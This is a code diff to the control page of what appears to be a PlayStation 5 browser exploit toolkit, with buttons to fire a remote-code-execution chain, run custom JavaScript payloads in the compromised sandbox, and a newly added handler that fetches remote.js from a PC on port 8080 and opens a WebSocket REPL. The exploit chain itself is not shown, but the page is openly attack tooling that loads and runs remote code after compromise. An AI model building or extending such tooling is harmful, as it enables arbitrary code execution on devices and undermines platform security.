@@ -176,6 +176,7 @@
                 <button class="btn pay" id="btnNotify">🔔 NOTIFY (PS5 toast)</button>
                 <button class="btn pay" id="btnReport">ℹ️ REPORT (info + scan + mem)</button>
                 <button class="btn pay" id="btnSyscall">🛰 TEST SYSCALLS (no crash)</button>
+                <button class="btn pay" id="btnRemotePc">📡 PC REMOTE (REPL — needs PC on :8080)</button>
                 <button class="btn pay danger" id="btnCommit">💥 COMMIT RCE (fire chain)</button>
                 <textarea class="ta" id="payloadCode" spellcheck="false" placeholder="custom JS payload — runs in the sandbox after RCE (window.rwView / scratchWords / kernelBase … available)"></textarea>
                 <div class="row"><button class="btn" id="btnRunPayload">⚡ RUN PAYLOAD</button><button class="btn ghost" id="btnLoadNotifyJs">📄 load notification.js</button></div>
@@ -468,6 +469,22 @@ $("btnSyscall").addEventListener("click", () => {
     } catch (e) {
         addLog("[ERR] syscall battery threw: " + String(e && e.message));
     }
+});
+$("btnRemotePc").addEventListener("click", () => {
+    if (!payloadReady()) return;
+    if (typeof window.enableRemotePC !== "function"){
+        addLog("[ERR] enableRemotePC unavailable");
+        return;
+    }
+    addLog("[INFO] enabling PC remote — fetching http://" + (window.RCE_PC_IP ? window.RCE_PC_IP.join(".") : "PC") + ":8080/remote.js …");
+    window.enableRemotePC().then(res => {
+        if (res && res.ok){
+            addLog("[OK] PC remote loaded — WebSocket REPL active (ws://PC:50000)");
+        } else {
+            addLog("[WARN] PC remote failed: " + (res && res.error));
+            addLog("[INFO] check ws_server.py is running on your PC + RCE_PC_IP in exploit.js");
+        }
+    });
 });
 $("btnCommit").addEventListener("click", () => {
     if (!payloadReady()) return;
